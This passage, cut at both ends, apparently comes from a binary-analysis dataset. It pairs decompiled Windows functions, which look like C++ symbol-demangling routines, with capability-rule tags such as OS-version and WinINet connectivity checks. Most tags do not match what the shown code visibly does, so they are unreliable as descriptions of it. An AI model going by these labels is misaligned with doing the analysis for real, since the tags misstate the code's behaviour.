+ -0x47,  iVar9 != 0)) {\ncode_r0x00438305:\n                if (iVar9 != 1) goto code_r0x0043812a;\n            }\n        }\n    case 0x4a:\n    case 0x4b:\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n        pcVar7 = vtable.type_info.0 + **0x6ccc1c * 8;\n        *0x6ccc1c = puVar13;\ncode_r0x0043880a:\n        fcn.0043486d(pcVar7);\n        puVar1 = *0x6ccc1c;\n        if (ppcVar14 == NULL) {\ncode_r0x004382b1:\n            *0x6ccc1c = puVar1;\n            if (var_10h != NULL) {\n                var_20h = \"operator\";\n                var_1ch = 0x8;\n                fcn.00434593(&var_20h);\n                fcn.00434a09(&var_20h, &var_10h);\n                var_ch = var_1ch;\n                var_10h = var_20h;\n            }\n        }\n        else if (var_10h != NULL) {\n            var_ch = var_ch | 0x200;\n        }\n        *arg_8h = var_10h;\ncode_r0x004381bd:\n        arg_8h[1] = var_ch;\n    }\n    return arg_8h;\n}\n",
        "token_count": 5631
    },
    "004390fb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004390fb(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint arg_10h;\n    uint *arg_8h_00;\n    uint var_f0h;\n    uint var_e8h;\n    uint var_e0h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_c0h;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_a8h;\n    uint var_a0h;\n    uint var_98h;\n    uint var_90h;\n    uint var_88h;\n    uint var_80h;\n    uint var_78h;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    char *var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    bVar3 = false;\n    do {\n        if ((**0x6ccc1c == '\\0') || (**0x6ccc1c == '@')) break;\n        if ((*0x6ccc28 != '\\0') && (*0x6ccc29 == '\\0')) {\n            return arg_8h;\n        }\n        if (*arg_8h != 0) {\n            var_28h = 0x47da2c;\n            var_24h = 2;\n            fcn.00434593(&var_28h);\n            fcn.00434a09(&var_30h, arg_8h);\n            *arg_8h = var_30h;\n            arg_8h[1] = var_2ch;\n            if (bVar3) {\n                piVar5 = fcn.0043499a(&var_70h, 0x5b, arg_8h);\n                bVar3 = false;\n                *arg_8h = *piVar5;\n                arg_8h[1] = piVar5[1];\n            }\n        }\n        if (**0x6ccc1c == '?') {\n            pcVar1 = *0x6ccc1c + 1;\n            cVar2 = *pcVar1;\n            if (cVar2 == '$') {\n                fcn.0043a99f(&var_f0h, 1, 0);\n                arg_8h_00 = &var_50h;\n                goto code_r0x0043942c;\n            }\n            if (cVar2 != '%') {\n                if (cVar2 == '?') {\n                    if (((*0x6ccc1c)[2] != '_') || ((*0x6ccc1c)[3] != '?')) {\n                        *0x6ccc1c = pcVar1;\n                        arg_10h = fcn.00437145(&var_c8h);\n                        fcn.0043499a(&var_d0h, 0x60, arg_10h);\n                        fcn.00434a2b(&var_d8h, 0x27);\n                        arg_8h_00 = &var_e0h;\n                        goto code_r0x0043942c;\n                    }\n                    *0x6ccc1c = *0x6ccc1c + 2;\n                    fcn.004380b7(&var_b8h, 0, 0);\n                    piVar5 = fcn.00434a09(&var_c0h, arg_8h);\n                    *arg_8h = *piVar5;\n                    arg_8h[1] = piVar5[1];\n                    if (**0x6ccc1c == '@') {\ncode_r0x0043935f:\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                    }\n                    goto code_r0x00439441;\n                }\n                if (cVar2 == 'A') goto code_r0x004393a3;\n                if (cVar2 != 'I') {\n                    if (cVar2 == 'Q') {\n                        var_8h = 0;\n                        *0x6ccc1c = *0x6ccc1c + 2;\n                        var_4h = 0;\n                        do {\n                            iVar4 = var_8h;\n                            fcn.0043a99f(&var_20h, 1, 0);\n                            if (var_1ch == '\\0') {\n                                if (iVar4 == 0) {\n                                    var_8h = var_20h;\n                                    var_4h = var_1ch;\n                                }\n                                else {\n                                    var_18h = var_20h;\n                                    var_14h = var_1ch;\n                                    var_38h = 0x47da2c;\n                                    var_34h = 2;\n                                    fcn.00434aab(&var_38h);\n                                    piVar5 = fcn.00434a09(&var_88h, &var_8h);\n                                    var_8h = *piVar5;\n                                    var_4h = piVar5[1];\n                                }\n                            }\n                            else {\n                                var_8h = 0;\n                                var_4h = 2;\n                            }\n                            if (var_4h != '\\0') {\n                                arg_8h[1] = 0;\n                                *arg_8h = 0;\n                                *(arg_8h + 1) = 2;\n                                goto code_r0x00439441;\n                            }\n                        } while (**0x6ccc1c != '@');\n                        fcn.0043499a(&var_90h, 0x5b, &var_8h);\n                        piVar5 = fcn.00434a2b(&var_98h, 0x5d);\n                        *arg_8h = *piVar5;\n                        arg_8h[1] = piVar5[1];\n                        goto code_r0x0043935f;\n                    }\n                    *0x6ccc1c = pcVar1;\n                    fcn.00437ed6(&var_78h);\n                    arg_8h_00 = &var_80h;\n                    goto code_r0x0043942c;\n                }\n                *0x6ccc1c = *0x6ccc1c + 2;\n                fcn.0043a99f(&var_a0h, 1, 0);\n                fcn.00434a2b(&var_a8h, 0x5d);\n                piVar5 = fcn.00434a09(&var_b0h, arg_8h);\n                bVar3 = true;\n                goto code_r0x00439435;\n            }\ncode_r0x004393a3:\n            *0x6ccc1c = pcVar1;\n            fcn.00434513(0x6ccc1c, 0x40);\n            var_40h = \"`anonymous namespace\\'\";\n            var_3ch = 0x15;\n            fcn.00434593(&var_40h);\n            fcn.00434a09(&var_10h, arg_8h);\n            *arg_8h = var_10h;\n            arg_8h[1] = var_ch;\n            if (**0x6ccc14 != 9) {\n                fcn.00434c53(&var_48h);\n            }\n        }\n        else {\n            fcn.0043a99f(&var_58h, 1, 0);\n            arg_8h_00 = &var_60h;\ncode_r0x0043942c:\n            piVar5 = fcn.00434a09(arg_8h_00, arg_8h);\ncode_r0x00439435:\n            *arg_8h = *piVar5;\n            arg_8h[1] = piVar5[1];\n        }\ncode_r0x00439441:\n    } while (*(arg_8h + 1) == '\\0');\n    if (**0x6ccc1c == '\\0') {\n        if (*arg_8h == 0) {\n            fcn.00434903(1);\n        }\n        else {\n            var_10h = 0x47da2c;\n            var_ch = 2;\n            fcn.00434635(1);\n            fcn.004349e7(&var_58h, &var_10h);\n            piVar5 = fcn.00434a09(&var_50h, arg_8h);\n            *arg_8h = *piVar5;\n            arg_8h[1] = piVar5[1];\n        }\n    }\n    else if (**0x6ccc1c != '@') {\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        *(arg_8h + 1) = 2;\n    }\n    return arg_8h;\n}\n",
        "token_count": 2122
    },
    "00439690": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00439690(uchar *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if (*(in_ECX + 4) == 1) {\n        arg_ch = arg_ch - arg_8h;\n        iVar1 = 4;\n        if ((3 < arg_ch) || (iVar1 = arg_ch,  arg_ch != 0)) {\n            iVar2 = iVar1;\n            puVar3 = arg_8h;\n            do {\n                *puVar3 = puVar3[0x47dfd8 - arg_8h];\n                puVar3 = puVar3 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        arg_8h = arg_8h + iVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 213
    },
    "0043982b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043982b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    \n    if (**0x6ccc1c == '\\0') {\n        arg_8h_00 = 1;\n    }\n    else {\n        iVar1 = fcn.0045c5d0(*0x6ccc1c, 0x47daa4, 4);\n        if (iVar1 == 0) {\n            *0x6ccc1c = *0x6ccc1c + 4;\n            fcn.00439764(arg_8h, 0);\n            return arg_8h;\n        }\n        arg_8h_00 = 2;\n    }\n    fcn.00434635(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 186
    },
    "004398be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.004398be(uint *arg_8h)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_2h._0_1_ = '\\x01';\n    var_ch = 0;\n    uVar5 = 0;\n    var_8h = 0;\n    *0x6ccc29 = 1;\n    do {\n        pcVar3 = *0x6ccc1c;\n        cVar1 = **0x6ccc1c;\n        if ((cVar1 == '\\0') || (cVar1 == '@')) break;\n        var_14h = 0;\n        var_10h = 0;\n        var_2h._1_1_ = '\\0';\n        if (cVar1 - 0x30U < 10) {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            piVar4 = fcn.00434935(&fcn.004398be::var_24h, cVar1 - 0x30U);\n            iVar7 = *piVar4;\n            iVar6 = piVar4[1];\n            var_14h = iVar7;\n            var_10h = iVar6;\n            goto code_r0x004399f2;\n        }\n        if ((cVar1 == '$') && ((*0x6ccc1c)[1] == '$')) {\n            cVar1 = (*0x6ccc1c)[2];\n            if (cVar1 == '$') {\n                if ((*0x6ccc1c)[3] != 'V') goto code_r0x0043995d;\n                *0x6ccc1c = *0x6ccc1c + 4;\n            }\n            else {\n                if (cVar1 == 'U') {\ncode_r0x00439982:\n                    *0x6ccc1c = *0x6ccc1c + 3;\n                    goto code_r0x0043995d;\n                }\n                if (cVar1 != 'V') {\n                    if (cVar1 == 'W') {\n                        var_2h._1_1_ = '\\x01';\n                        goto code_r0x00439982;\n                    }\n                    if (cVar1 != 'Z') goto code_r0x0043995d;\n                }\n                *0x6ccc1c = *0x6ccc1c + 3;\n            }\n        }\n        else {\ncode_r0x0043995d:\n            if ((**0x6ccc1c == '$') && ((*0x6ccc1c)[1] != '$')) {\n                *0x6ccc1c = *0x6ccc1c + 1;\n                piVar4 = fcn.00439bce(&fcn.004398be::var_2ch);\n            }\n            else {\n                piVar4 = fcn.00439fa8(&fcn.004398be::var_34h);\n            }\n            piVar2 = *0x6ccc18;\n            iVar6 = piVar4[1];\n            iVar7 = *piVar4;\n            var_14h = iVar7;\n            var_10h = iVar6;\n            if ((*0x6ccc1c - pcVar3 < 2) || (**0x6ccc18 == 9)) {\ncode_r0x004399f2:\n                if (iVar7 != 0) {\n                    if (var_2h == '\\0') {\n                        fcn.00434b5a(0x2c);\n                    }\n                    fcn.00434b03(0x439a12);\n                    uVar5 = var_8h;\n                    if (var_2h._1_1_ != '\\0') {\n                        var_1ch = 0x47daac;\n                        var_18h = 3;\n                        fcn.00434aab(&fcn.004398be::var_1ch);\n                        uVar5 = var_8h;\n                    }\n                    goto code_r0x00439a3c;\n                }\n            }\n            else if (iVar7 != 0) {\n                piVar4 = fcn.00437f77(8);\n                if (piVar4 != NULL) {\n                    *piVar4 = iVar7;\n                    piVar4[1] = iVar6;\n                    *piVar2 = *piVar2 + 1;\n                    piVar2[*piVar2 + 1] = piVar4;\n                }\n                goto code_r0x004399f2;\n            }\n            uVar5 = var_8h;\n            if ('\\x01' < iVar6) {\n                fcn.00434635(2);\n                return arg_8h;\n            }\n        }\ncode_r0x00439a3c:\n        var_2h._0_1_ = '\\0';\n    } while (uVar5 == '\\0');\n    *0x6ccc29 = 0;\n    *arg_8h = var_ch;\n    arg_8h[1] = uVar5;\n    return arg_8h;\n}\n",
        "token_count": 1240
    },
    "00439bce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00439bce(uint *arg_8h)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_2ch;\n    uint var_24h;\n    uint32_t var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    pcVar1 = *0x6ccc1c + 1;\n    iVar4 = **0x6ccc1c;\n    var_18h = iVar4;\n    // switch table (16 cases) at 0x439f76\n    switch(iVar4) {\n    case 0x47:\n    case 0x48:\n    case 0x49:\n    case 0x4a:\ncode_r0x00439d4d:\n        var_1ch = NULL;\n        var_18h = 0;\n        *0x6ccc1c = pcVar1;\n        fcn.00435abf(0x7b);\n        if (((iVar4 == 0x48) || (iVar4 == 0x49)) || (iVar4 == 0x4a)) {\n            uVar5 = fcn.00437145(&var_24h);\n            fcn.00434b03(uVar5);\n            fcn.00434b5a(0x2c);\n        }\n        if (iVar4 == 0x46) {\ncode_r0x00439dc3:\n            uVar5 = fcn.004395ac(&var_24h);\n            fcn.00434b03(uVar5);\n            fcn.00434b5a(0x2c);\ncode_r0x00439de0:\n            uVar5 = fcn.004395ac(&var_24h);\n            fcn.00434b03(uVar5);\n        }\n        else {\n            if (iVar4 == 0x47) {\ncode_r0x00439da6:\n                uVar5 = fcn.004395ac(&var_24h);\n                fcn.00434b03(uVar5);\n                fcn.00434b5a(0x2c);\n                goto code_r0x00439dc3;\n            }\n            if (iVar4 == 0x48) goto code_r0x00439de0;\n            if (iVar4 == 0x49) goto code_r0x00439dc3;\n            if (iVar4 == 0x4a) goto code_r0x00439da6;\n        }\n        uVar5 = 0x7d;\n        break;\n    case 0x4b:\n    case 0x4c:\n    case 0x4f:\n    case 0x51:\n        goto code_r0x00439f5b;\n    case 0x4d:\n        *0x6ccc1c = pcVar1;\n        fcn.00439fa8(&var_1ch);\n        pcVar1 = *0x6ccc1c;\n        if (var_18h < '\\x02') {\n            fcn.00439bce(arg_8h);\n            goto code_r0x00439f64;\n        }\n        goto code_r0x00439f5b;\n    case 0x4e:\n        var_1ch = \"nullptr\";\n        var_18h = 7;\n        *0x6ccc1c = pcVar1;\n        goto code_r0x00439c7c;\n    case 0x50:\n        *0x6ccc1c = pcVar1;\n        fcn.00437399(&var_2ch, 0);\n        var_1ch = \"lambda\";\n        var_18h = 6;\ncode_r0x00439c7c:\n        fcn.00434593(&var_1ch);\n        goto code_r0x00439f64;\n    case 0x52:\n    case 0x54:\n    case 0x55:\n    case 0x56:\n        *0x6ccc1c = pcVar1;\n        fcn.004395ac(&var_24h);\n        var_14h = 0;\n        uStack20 = 0;\n        uStack16 = 0;\n        uStack12 = 0;\n        fcn.0043963b(&var_14h, 0x10);\n        uVar3 = fcn.0045c548(&var_14h);\n        pcVar2 = *0x6ccc2c;\n        if (((*0x6ccc24 & 0x4000) != 0) && (*0x6ccc2c != NULL)) {\n            (**0x47b3f8)(uVar3 & 0xfff);\n            iVar4 = (*pcVar2)();\n            if (iVar4 != 0) {\n                var_20h = var_20h & 0xffffff00;\n                fcn.004340dd(iVar4);\n                goto code_r0x00439f64;\n            }\n        }\n        fcn.0043afa1(&var_14h, 0x10, 0x47dab8, uVar3 & 0xfff);\n        var_20h = var_20h & 0xffffff00;\n        fcn.0043406a(&var_14h);\n        if ((var_18h == 0x52) || (var_18h == 0x54)) {\n            var_1ch = \"`template-type-parameter-\";\ncode_r0x00439efb:\n            var_18h = 0x19;\n        }\n        else {\n            if (var_18h == 0x55) {\n                var_1ch = \"`generic-class-parameter-\";\n                goto code_r0x00439efb;\n            }\n            pcVar1 = *0x6ccc1c;\n            if (var_18h != 0x56) goto code_r0x00439f5b;\n            var_1ch = \"`generic-method-parameter-\";\n            var_18h = 0x1a;\n        }\n        fcn.00434593(&var_1ch);\n        fcn.00434a09(&var_1ch, &var_24h);\n        uVar5 = 0x27;\n        break;\n    case 0x53:\n        *0x6ccc1c = pcVar1;\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        goto code_r0x00439f64;\n    default:\n        if (iVar4 == 0x46) goto code_r0x00439d4d;\n        if (0x36 < iVar4) {\n            if (iVar4 == 0x37) {\n                *0x6ccc1c = pcVar1;\n                fcn.0043a562(arg_8h);\n                goto code_r0x00439f64;\n            }\n            if (iVar4 == 0x38) {\n                *0x6ccc1c = pcVar1;\n                fcn.004389cd(arg_8h);\n                goto code_r0x00439f64;\n            }\n            if ((iVar4 == 0x41) || (iVar4 == 0x42)) {\n                *0x6ccc1c = pcVar1;\n                fcn.004379d5(arg_8h, iVar4);\n                goto code_r0x00439f64;\n            }\n            if (iVar4 == 0x43) {\n                *0x6ccc1c = pcVar1;\n                fcn.00435e23(arg_8h);\n                goto code_r0x00439f64;\n            }\n            if (iVar4 == 0x45) {\n                *0x6ccc1c = pcVar1;\n                fcn.00437145(arg_8h);\n                goto code_r0x00439f64;\n            }\n            goto code_r0x00439f5b;\n        }\n        if (iVar4 == 0x36) {\n            *0x6ccc1c = pcVar1;\n            fcn.00437f07(arg_8h);\n            goto code_r0x00439f64;\n        }\n        if (iVar4 != 0) {\n            if (iVar4 == 0x30) {\n                *0x6ccc1c = pcVar1;\n                fcn.004395ac(arg_8h);\n                goto code_r0x00439f64;\n            }\n            if (iVar4 == 0x31) {\n                if (*pcVar1 != '@') {\n                    var_1ch = NULL;\n                    var_18h = 0;\n                    *0x6ccc1c = pcVar1;\n                    fcn.00435abf(0x26);\n                    uVar5 = fcn.00437145(&var_24h);\n                    fcn.00434a09(arg_8h, uVar5);\n                    goto code_r0x00439f64;\n                }\n                var_1ch = \"NULL\";\n                var_18h = 4;\n                *0x6ccc1c = *0x6ccc1c + 2;\n                goto code_r0x00439c7c;\n            }\n            if (iVar4 == 0x32) {\n                *0x6ccc1c = pcVar1;\n                fcn.0043a6db(arg_8h);\n                goto code_r0x00439f64;\n            }\n            if (iVar4 == 0x34) {\n                *0x6ccc1c = pcVar1;\n                fcn.0043982b(arg_8h);\n                goto code_r0x00439f64;\n            }\n            if (iVar4 == 0x35) {\n                *0x6ccc1c = pcVar1;\n                fcn.00435b49(arg_8h);\n                goto code_r0x00439f64;\n            }\n            goto code_r0x00439f5b;\n        }\n        uVar5 = 1;\n        goto code_r0x00439f5d;\n    }\n    fcn.00434a2b(arg_8h, uVar5);\ncode_r0x00439f64:\n    fcn.004303e9(unaff_EBX);\n    return;\ncode_r0x00439f5b:\n    *0x6ccc1c = pcVar1;\n    uVar5 = 2;\ncode_r0x00439f5d:\n    fcn.00434635(uVar5);\n    goto code_r0x00439f64;\n}\n",
        "token_count": 2399
    },
    "00439fa8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid __cdecl fcn.00439fa8(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    uint var_2ch;\n    char *var_24h;\n    uint *var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    if (**0x6ccc1c == 'X') {\n        *0x6ccc1c = *0x6ccc1c + 1;\n        var_24h = \"void\";\n        var_20h = 0x4;\n        fcn.00434593(&fcn.00439fa8::var_24h);\n    }\n    else if (**0x6ccc1c == '?') {\n        fcn.004395ac(&fcn.00439fa8::var_24h);\n        if (((*0x6ccc24 & 0x4000) != 0) && (*0x6ccc2c != NULL)) {\n            var_14h = 0;\n            uStack20 = 0;\n            uStack16 = 0;\n            uStack12 = 0;\n            fcn.0043963b(&fcn.00439fa8::var_14h, 0x10);\n            pcVar1 = *0x6ccc2c;\n            uVar2 = fcn.0045c548(&fcn.00439fa8::var_14h);\n            (**0x47b3f8)(uVar2);\n            arg_8h_00 = (*pcVar1)();\n            if (arg_8h_00 != 0) {\n                var_20h = var_20h & 0xffffff00;\n                fcn.004340dd(arg_8h_00);\n                goto code_r0x0043a0aa;\n            }\n        }\n        var_20h = &fcn.00439fa8::var_1ch;\n        var_1ch = \"`template-parameter\";\n        var_18h = 0x13;\n        var_24h = 0x43a07a;\n        fcn.00434593(var_20h);\n        var_24h = &fcn.00439fa8::var_24h;\n        fcn.00434a09(&fcn.00439fa8::var_1ch, var_24h);\n        var_2ch = 0x27;\n        fcn.00434a2b(arg_8h, 0x27);\n    }\n    else {\n        var_1ch = NULL;\n        var_18h = 0;\n        fcn.00438abf(arg_8h, &fcn.00439fa8::var_1ch);\n    }\ncode_r0x0043a0aa:\n    fcn.004303e9(var_2ch);\n    return;\n}\n",
        "token_count": 726
    },
    "0043a562": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0043a562(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint in_stack_ffffffd0;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c != '\\0') {\n        fcn.00439fa8(&var_10h);\n        fcn.00434a2b(&var_8h, 0x7b);\n        if (**0x6ccc1c != '@') {\n            uVar1 = fcn.0043a99f(&var_10h, 0, 0);\n            fcn.00434b03(uVar1);\n            fcn.00434b5a(0x3a);\n            uVar1 = fcn.00439bce(&var_10h);\n            fcn.00434b03(uVar1);\n        }\n        fcn.00434b5a(0x7d);\n        if (**0x6ccc1c == '@') {\n            *0x6ccc1c = *0x6ccc1c + 1;\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        in_stack_ffffffd0 = 2;\n    }\n    fcn.00434635(in_stack_ffffffd0);\n    return arg_8h;\n}\n",
        "token_count": 321
    },
    "0043a6db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0043a6db(uint *arg_8h)\n\n{\n    char cVar1;\n    uint in_stack_ffffffc4;\n    uint uVar2;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x6ccc1c != '\\0') {\n        fcn.00439fa8(&var_8h);\n        if (var_4h < '\\x02') {\n            uVar2 = 0x7b;\n            do {\n                fcn.00434b5a(uVar2);\n                cVar1 = **0x6ccc1c;\n                if (cVar1 == '2') {\n                    *0x6ccc1c = *0x6ccc1c + 1;\n                    uVar2 = fcn.0043a6db(&var_30h);\ncode_r0x0043a785:\n                    fcn.00434b03(uVar2);\n                }\n                else {\n                    if (cVar1 == '3') {\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                        uVar2 = fcn.00435e97(&var_28h);\n                        goto code_r0x0043a785;\n                    }\n                    if (cVar1 == '4') {\n                        *0x6ccc1c = *0x6ccc1c + 1;\n                        uVar2 = fcn.0043982b(&var_20h);\n                        goto code_r0x0043a785;\n                    }\n                    if (cVar1 != '@') {\n                        uVar2 = fcn.00439fa8(&var_10h);\n                        fcn.00434b03(uVar2);\n                        fcn.00434b5a(0x3a);\n                        uVar2 = fcn.00439bce(&var_18h);\n                        goto code_r0x0043a785;\n                    }\n                }\n                if ('\\x01' < var_4h) break;\n                if (**0x6ccc1c == '@') {\n                    *0x6ccc1c = *0x6ccc1c + 1;\n                    fcn.00434b5a(0x7d);\n                    *arg_8h = var_8h;\n                    arg_8h[1] = var_4h;\n                    return arg_8h;\n                }\n                uVar2 = 0x2c;\n            } while( true );\n        }\n        in_stack_ffffffc4 = 2;\n    }\n    fcn.00434635(in_stack_ffffffc4);\n    return arg_8h;\n}\n",
        "token_count": 622
    },
    "0043a84b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0043a84b(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    char *var_8h;\n    uint var_4h;\n    \n    *arg_8h = *arg_ch;\n    uVar2 = arg_ch[1];\n    arg_8h[1] = uVar2;\n    if (uVar2 < '\\x02') {\n        if (**0x6ccc1c == '\\0') {\n            fcn.00434635(1);\n            fcn.00434a09(&var_8h, arg_8h);\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n        }\n        else {\n            fcn.00437040(&var_8h);\n            fcn.00434a2b(&var_10h, 0x20);\n            puVar1 = fcn.00434a09(&var_18h, arg_8h);\n            *arg_8h = *puVar1;\n            uVar2 = puVar1[1];\n            arg_8h[1] = uVar2;\n            if (uVar2 < '\\x02') {\n                if (**0x6ccc1c != '@') {\n                    var_8h = \"{for \";\n                    var_4h = 5;\n                    do {\n                        fcn.00434aab(&var_8h);\n                        do {\n                            if ('\\x01' < *(arg_8h + 1)) {\ncode_r0x0043a96c:\n                                if (**0x6ccc1c != '@') {\n                                    return arg_8h;\n                                }\n                                goto code_r0x0043a971;\n                            }\n                            if (**0x6ccc1c == '\\0') {\ncode_r0x0043a951:\n                                if (**0x6ccc1c == '\\0') {\n                                    fcn.00434c13(1);\n                                }\n                                fcn.00434b5a(0x7d);\n                                goto code_r0x0043a96c;\n                            }\n                            if (**0x6ccc1c == '@') {\n                                if ('\\x01' < *(arg_8h + 1)) goto code_r0x0043a96c;\n                                goto code_r0x0043a951;\n                            }\n                            uVar2 = fcn.004390fb(&var_18h);\n                            fcn.0043499a(&var_10h, 0x60, uVar2);\n                            uVar2 = fcn.00434a2b(&var_20h, 0x27);\n                            fcn.00434b03(uVar2);\n                            if (**0x6ccc1c == '@') {\n                                *0x6ccc1c = *0x6ccc1c + 1;\n                            }\n                        } while (('\\x01' < *(arg_8h + 1)) || (**0x6ccc1c == '@'));\n                        var_8h = 0x47de58;\n                        var_4h = 2;\n                    } while( true );\n                }\ncode_r0x0043a971:\n                *0x6ccc1c = *0x6ccc1c + 1;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 757
    },
    "0043b78b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b78b(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 5) == '\\x02') {\n        *(*param_1 + 0x350) = *(*param_1 + 0x350) & 0xfffffffd;\n    }\n    if (*(param_1 + 7) != '\\0') {\n        iVar1 = param_1[6];\n        iVar2 = fcn.0043b89e();\n        *(iVar2 + 0x10) = iVar1;\n    }\n    if (*(param_1 + 9) != '\\0') {\n        iVar1 = param_1[8];\n        iVar2 = fcn.0043b89e();\n        *(iVar2 + 0x14) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "0043b7f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
